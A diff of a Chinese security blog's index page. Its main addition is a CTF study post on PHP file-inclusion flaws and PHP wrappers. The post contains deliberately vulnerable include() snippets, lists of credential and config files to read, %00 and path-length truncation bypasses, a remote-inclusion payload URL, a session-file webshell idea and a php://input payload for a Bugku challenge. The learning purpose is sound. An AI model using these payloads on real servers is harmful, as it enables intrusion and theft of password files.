@@ -64,9 +64,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-0.文件包含漏洞和php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-文件包含漏洞和php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/19/0.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
+    <a href="/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
   <time datetime="2020-11-19T13:46:21.885Z" itemprop="datePublished">2020-11-19</time>
 </a>
     
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/19/0.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含漏洞和php伪协议</a>
+      <a class="article-title" href="/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含漏洞和php伪协议</a>
     </h1>
   
 
@@ -86,12 +86,97 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>复现题目”flag在index里”</p>
+        <p>最近在刷Bugku的题，看到题目”flag在index里”用到了文件包含漏洞和php伪协议的知识，想到之前也做过有关这个知识点的题，但是当时没有仔细学，这次打算仔细学学这些内容。</p>
+<p>0.文件包含漏洞</p>
+<p>PHP中文件包含函数有require()/require_once()/include()/include_once()，会将参数当做PHP代码运行，而include()运行过程如果出错，抛出一个警告之后仍会继续运行。而如果用户包含一些恶意文件呢？就会执行一些非预期代码，这就是文件包含漏洞。</p>
+<p>1.本地文件包含漏洞</p>
+<p>(1)无限制文件包含漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以用来读取一些系统默认的敏感文件</p>
+<p>Windows：</p>
+<p>c:\boot.ini // 查看系统版本</p>
+<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
+<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
+<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
+<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
+<p>c:\windows\php.ini // php 配置信息</p>
+<p>Linux：</p>
+<p>/etc/passwd // 账户信息</p>
+<p>/etc/shadow // 账户密码文件</p>
+<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
+<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
+<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
+<p>/etc/my.conf // mysql 配置文件</p>
+<p>(2)session文件包含漏洞</p>
+<p>基础知识：</p>
+<p>Q：什么是session？什么是cookie？什么是token？有什么区别？</p>
+<p>A：直接看参考网站2/3，写的非常好</p>
+<p>Q：Session的文件名是什么？</p>
+<p>A：”sess”_+sessionid</p>
+<p>利用条件：</p>
+<p>(a).既然属于文件包含漏洞，肯定最起码的得有个include()能让我们执行自己的文件吧，也就是要有1.(1)的先决条件</p>
+<p>(b)session可控，能让我们传入恶意代码</p>
+<p>(c)sessionid在cookie中能被我们看到</p>
+<p>(d)我们可以得到phpinfo()的信息或者我们能自己猜出session存放的位置（后者很大程度是在赌默认存放位置没被修改）</p>
+<p>满足了以上条件，就可以利用这个漏洞了</p>
+<p>利用方法：</p>
+<p>首先，我们将传入可控session，将&lt;?php phpinfo(); ?&gt;写进去，通过得到或者猜到的session存放位置去include()我们自己写的session文件，就能得到phpinfo()信息。</p>
+<p>看到这可能会觉得这个漏洞是不是nt啊。如果我已经得到了phpinfo的信息了，那我再通过这个漏洞得到phpinfo不是完全就是多余的么？但是仔细想想，那如果我传入的不是&lt;?php phpinfo(); ?&gt;，比如我上传的是个一句话木马呢？说到这就不用往下说了，懂得都懂/坏笑，感觉这里有点像文件上传漏洞了。</p>
+<p>(3)有限制本地文件包含漏洞绕过</p>
+<p>(a).%00截断</p>
+<p>基础知识：</p>
+<p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据并对某些字符进行转义。在magic_quotes_gpc=ON的时候，如果有get、post、cookie过来的数据中有单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符），就会自动给他们添加反斜线（\）来进行转义。如果为Off还想保留这个功能，就需要自己调用addslashes这个函数。</p>
+<p>利用条件：</p>
+<p>magic_quotes_gpc=OFF且php版本&lt;5.3.4（php5.3.4已经解决了%00的漏洞。顺带一提，php5.3之后set_magic_quotes_gpc就没有了…甚至php6就没有这个特性了QAQ，时代变了呀）</p>
+<p>利用方法：</p>
+<p>如果代码是像下面这种形式来固定我们执行文件的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以在输入的filename末尾截断它，比如我们设置filename=”../../../boot,ini%00”，那么最后就会忽略那个.html，以我们自己想要的格式去执行我们的文件</p>
+<p>PS:如果PHP版本确实小于5.3.4但是magic_quotes_gpc设置为ON怎么办？我虽然还没碰到过这种题但是大胆猜测一下结合宽字节注入。</p>
+<p>(b)路径长度截断</p>
+<p>基础知识：</p>
+<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
+<p>漏洞利用：</p>
+<p>还是比如下面这种代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么我的filename设置为”test.txt/././././.(在这省略若干个”/.”)”，最后就可以截断”.html了”</p>
+<p>PS：对于Windows OS来说，可以直接输入总长度超过256的“.”来隔断</p>
+<p>2.远程文件包含漏洞</p>
+<p>如果PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。相比本地文件包含漏洞，远程文件包含漏洞危害更大，因为普通的本地包含漏洞只能读取网页内部的本地敏感信息，并不会执行什么别的代码。</p>
+<p>(a)无限制远程文件包含漏洞</p>
+<p>还是这个例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以构造类似<code>http://www.xxxxxx.com/?filename=http://aaaa/jiaoben.php</code>这样的payload，其中aaaaa/jiaoben.php是一个别的网站的恶意代码</p>
+<p>PS：这里的aaaaa/jiaoben.php挂自己localhost里的脚本是不好使的，因为对于题目的服务器来说，这里localhost是他的本地而不是我的本地，他是找不到我写在本地的恶意脚本的。因此想要让他执行我写的恶意代码，只能写在一个能在互联网上被访问的网页中，或者我能把我写的恶意代码上传到他的服务器</p>
+<p>(b)有限制远程文件包含漏洞绕过</p>
+<p>比如<code>&lt;?php include($_GET[&#39;filename&#39;].&quot;.html&quot;);?&gt;</code>这种，可以在jiaoben.php后面加问号(?)，井号(%23)，空格(%20)等尝试绕过</p>
+<p>3.PHP伪协议</p>
+<p>基础知识：</p>
+<p>allow_url_fopen：是否允许将URL（如http：//或ftp：//）作为文件处理，默认ON。</p>
+<p>allow_url_include：是否允许include/require打开URL（如http：//或ftp：//）作为文件处理，PHP5.2以后就变成默认为OFF了。</p>
+<p>漏洞利用：直接看参考网站5，用的比较多的就是php://协议和data://协议，常用来读取源码和写入木马的。</p>
+<p>PS：正好刷到BUGKU上的web8，点进去给了源码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))&#123;$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;&#125;</span><br><span class="line">else&#123;echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>预期解是猜测flag.txt的存在，然后得到flag.txt里的内容在GET传参。但是靠猜我觉得不大稳，还看到网上师傅们有非预期解。payload：<code>http://123.206.87.240:8002/web8/?ac=aaa&amp;fn=php://input</code>在POST传参”aaa”就得到flag了。</p>
+<p>我这里一开始很不解，因为我去查file_get_contents()这个函数发现如果查找不到文件会返回false，那他是怎么相等的？？之后发现是自己想错了。这里并非是先令fn=POST的值，然后再把这个值作为参数去file_get_contents()。而是先GET传参得到fn=php://input，然后通过file_get_contents(“php://input”）来直接读取POST的数据。可以理解成file_get_contents(“php://input”)是个固定搭配，就是把POST的数据当成一个文件读取的。</p>
+<p>这他妈就是大佬对知识的理解吗ORZ</p>
+<p>PPS：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/redfire/p/7695263.html">参考网站</a></p>
+<p>参考网站：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/182280.html">文件包含漏洞整体框架</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whl190412/article/details/90024671">cookie/session/token1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807727.html">cookie/session/token2</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/0.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckht1go040002ksv02l4pejnf" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="ckhulmi61000640v08s3y1hvt" class="article-share-link">Share</a>
       
       
     </footer>
@@ -154,7 +239,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckht1go0b0005ksv0051n5s59" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/19/python%20requests.session()%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8Cbase64%E5%9C%A8%E6%AD%A3%E5%88%99%E4%B8%AD%E7%9A%84%E5%BD%A2%E5%BC%8F/" data-id="ckhulmi5u000240v016jw321p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -279,12 +364,8 @@
 <p>utf7编码规则看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fvan/archive/2006/02/26/338326.html">这里</a></p>
 <p>PS:utf7这里用的base64编码是修正的，即不是8位一组变6位一组再添0，而是当做双字节(两个8位二进制)读取后6位一组再添0)</p>
 <p>即可以构造<code>+AGY-lag</code>，输入即可得到flag</p>
-<p>*10.233同学的Docker</p>
-<p>挖个坑，要开始学docker了</p>
 <p>*11.从零开始的HTTP链接</p>
 <p>再挖坑，linux也要开始学了呀</p>
-<p>*13.超简陋的OpenGL小程序</p>
-<p>再挖坑，OpenGL也要开始学了呀</p>
 <p>16.狗狗银行</p>
 <p>这个题真的很好。。。储蓄卡利率0.3%，信用卡利率0.5%，但是如果存了167元，167的0.3%就是0.501，四舍五入变成1元，利率就会很接近0.6%比0.5%大，也就是说只要我卡里存了167，相当于就在赚钱。只要办一张信用卡再办很多储蓄卡，通过信用卡转账给每张储蓄卡167元，每天产一块还回信用卡，相当于净资产就在增加，只要储蓄卡办的够多，赚的就越多，只要每天赚的钱比我吃饭花的10块钱多，总资产就会不断增加，等他超过2000就好了。</p>
 <p>我不由得想起我小学三年级刚学四舍五入那会儿，我就有了一个疑问，如果我把一块钱看成两个五毛，四舍五入就变成了两块钱。<del>果然薅羊毛要从娃娃抓起。</del></p>
@@ -300,7 +381,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckht1go0w0009ksv0ga9s5pck" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/11/0.Hackergame2020-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckhulmi64000840v02mac19y4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -394,7 +475,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckht1go0u0008ksv02mav9k0t" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/31/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80--IP-%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckhulmi63000740v0e0tqhyf2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -431,44 +512,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckht1go010001ksv0gs2iczkg" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-0.burpsuite使用攻略" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/24/0.burpsuite%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/" class="article-date">
-  <time datetime="2020-10-24T03:13:09.760Z" itemprop="datePublished">2020-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/24/0.burpsuite%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/">burpsuite使用攻略</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>有必要仔细研究一下burpsuite了，挖个坑</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/24/0.burpsuite%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/" data-id="ckht1gnzm0000ksv09eydd8q2" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/24/0.%E6%9C%89%E5%85%B3SSTI%E6%BC%8F%E6%B4%9E%E5%92%8Cflask%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckhulmi5i000040v0a8ih7qd4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -552,7 +596,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckht1go070003ksv01fv6doot" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckhulmi5s000140v081z7abwl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -608,7 +652,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckht1go0d0006ksv0del7dne0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckhulmi60000540v01w6t1nor" class="article-share-link">Share</a>
       
       
     </footer>
@@ -723,7 +767,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckht1go090004ksv0gjgoc1wm" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckhulmi5y000440v0dxhc9vt0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -781,7 +825,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckht1go0f0007ksv0a6ds1xc0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckhulmi5w000340v00h3zar2w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -822,7 +866,7 @@
       <ul>
         
           <li>
-            <a href="/2020/11/19/0.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含漏洞和php伪协议</a>
+            <a href="/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含漏洞和php伪协议</a>
           </li>
         
           <li>
